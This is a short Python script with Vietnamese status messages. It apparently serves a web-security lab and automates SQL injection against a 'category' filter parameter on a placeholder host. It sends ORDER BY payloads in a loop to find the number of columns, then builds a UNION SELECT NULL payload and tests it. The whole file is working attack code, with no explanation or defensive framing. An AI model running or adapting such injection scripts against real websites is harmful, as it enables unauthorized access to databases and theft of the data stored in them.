import requests
host="YOUR_HOST"
base_url=f"https://{host}/filter?category=' "
headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
}
def find_column_count():
    print("[*] Đang xác định số lượng cột bằng ORDER BY...")
    for i in range(1,21):
        payload=f"ORDER BY {i} -- -"
        res=requests.get(base_url+payload,headers=headers)
        if res.status_code !=200:
            column_count=i-1
            print(f"[+] Thành công! Số lượng cột là: {column_count}")
            return column_count        
    return 0

num_cols = find_column_count()
if num_cols>0:
    null_list=["NULL"]*num_cols
    payload="UNION SELECT "+", ".join(null_list)+" -- -"
    print("-" * 30)
    print(f"Payload UNION của bạn là:\n{payload}")
    print("-" * 30)
    
    res = requests.get(base_url + payload, headers=headers)
    if res.status_code == 200:
        print("[!] Payload UNION hoạt động hoàn hảo!")
    else:
        print("[?] Có lỗi xảy ra khi gửi Payload UNION.")